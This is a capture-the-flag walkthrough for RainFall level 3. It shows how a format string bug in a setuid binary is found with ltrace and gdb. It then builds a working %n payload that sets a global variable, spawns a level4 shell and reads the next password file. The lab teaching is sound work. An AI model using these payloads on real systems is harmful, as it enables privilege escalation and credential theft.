# Level 3 - Format String Exploitation Walkthrough

---

## Binary Analysis

### Initial Enumeration

```bash
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

### Key Observations

- **Setuid/Setgid binary (`rwsr-s`)**
- Runs with **level4 privileges**
- Owned by **level4**
- Goal: Read `/home/user/level4/.pass`

---

## Basic Behavior

```bash
level3@RainFall:~$ ./level3
hello
hello

level3@RainFall:~$ echo "test" | ./level3
test
```

The program simply echoes input.

---

## Vulnerability Discovery

Using `ltrace`:

```bash
level3@RainFall:~$ ltrace ./level3
__libc_start_main(...)
fgets("\n", 512, 0xb7fd1ac0) = 0xbffff550
printf("\n") = 1
+++ exited (status 0) +++
```

### 🚨 Critical Finding

`printf()` is called directly with user input:

```c
printf(buffer);
```

This creates a **Format String Vulnerability**.

---

## Testing Format Strings

```bash
level3@RainFall:~$ python -c 'print "%x %x %x %x"' | ./level3
200 b7fd1ac0 b7e454d3 bffff550
```

✔ Format specifiers are interpreted  
✔ We can read stack values  

---

# Reverse Engineering

## Function Overview

```bash
(gdb) info functions
0x08048390  printf@plt
0x080483a0  fgets@plt
0x080483b0  fwrite@plt
0x080483c0  system@plt      ← Target
0x080484a4  v
0x0804851a  main
```

---

## `main` Function

```bash
(gdb) disas main
0x0804851a <+0>:  push   %ebp
0x0804851b <+1>:  mov    %esp,%ebp
0x0804851d <+3>:  and    $0xfffffff0,%esp
0x08048520 <+6>:  call   0x80484a4 <v>
0x08048525 <+11>: leave
0x08048526 <+12>: ret
```

`main()` simply calls `v()`.

---

## The Critical Function: `v`

```bash
(gdb) disas v
0x080484c7 <+35>: call   fgets@plt
0x080484d5 <+49>: call   printf@plt   ← Vulnerability
0x080484da <+54>: mov    0x804988c,%eax
0x080484df <+59>: cmp    $0x40,%eax
0x080484e2 <+62>: jne    exit
...
0x08048507 <+99>: call   fwrite@plt   ← Prints "Wait what?!"
0x08048513 <+111>: call   system@plt  ← Spawns shell
```

---

## Strings in Binary

```bash
(gdb) x/s 0x8048600
"Wait what?!\n"

(gdb) x/s 0x804860d
"/bin/sh"
```

---

# 🎯 The Goal

Make the global variable at:

```
0x804988c
```

Equal to:

```
0x40 (64)
```

So the program executes:

```c
system("/bin/sh");
```

---

**Note**
- Why 0x804988c is a Global Variable
- Memory Region Analysis
- In 32-bit x86 Linux, memory is typically organized as:

```text
Address Range        | Region        | Description
---------------------|---------------|--------------------
0x08048000 - 0x0804xxxx | .text        | Program code
0x0804xxxx - 0x08049xxx | .data/.bss   | Global variables
0xbffxxxxx - 0xbfxxxxxx | Stack        | Local variables
0xb7xxxxxx - 0xb8xxxxxx | Libraries    | Shared libraries
```

# Understanding Format String Exploitation

## How `%n` Works

```c
int count;
printf("Hello%n world", &count);
```

`%n` writes the number of characters printed so far into the supplied address.

If 5 characters were printed:

```
count = 5
```

---

## Stack Behavior

When `printf(buffer)` runs:

- Our input is used as the **format string**
- Stack values are interpreted as arguments
- We can:
  - Read memory using `%x`
  - Write memory using `%n`

---

# Exploit Development

---

## Step 1: Find Our Offset

```bash
python -c 'print "AAAA" + "%x " * 15' | ./level3
```

Output includes:

```
41414141
```

`41414141` = `"AAAA"` in hex.

✔ Our input appears at **position 4**

---

## Step 2: Confirm Direct Access

```bash
python -c 'print "AAAA%4$x"' | ./level3
```

Output:

```
AAAA41414141
```

✔ `%4$x` accesses our injected value.

---

## Step 3: Craft the Payload

We need to:

1. Put target address at position 4
2. Print exactly 64 characters
3. Use `%4$n` to write 64

### Target Address (Little Endian)

```
0x0804988c
```

Becomes:

```
\x8c\x98\x04\x08
```

### Build Payload

```python
address = "\x8c\x98\x04\x08"
padding = "A" * 60
format  = "%4$n"

payload = address + padding + format
```

Why 60 padding?

- 4 bytes (address)
- 60 bytes padding
- Total printed = 64 bytes

Then:

```
%4$n
```

Writes 64 to our target address.

---

## Step 4: Trigger Backdoor

```bash
python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' | ./level3
```

Output:

```
Wait what?!
```

✔ Condition satisfied  
✔ Backdoor triggered  

---

## Step 5: Get Interactive Shell

```bash
(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
```

Now interact:

```bash
whoami
level4

cat /home/user/level4/.pass
```

---

# 🧠 Why This Works

1. `printf()` trusts user input
2. `%n` allows writing arbitrary memory
3. We control where `%n` writes
4. We control how many bytes are written
5. We overwrite a global variable
6. Condition becomes true
7. Program executes `system("/bin/sh")`
8. Because binary is setuid → we get level4 shell

---
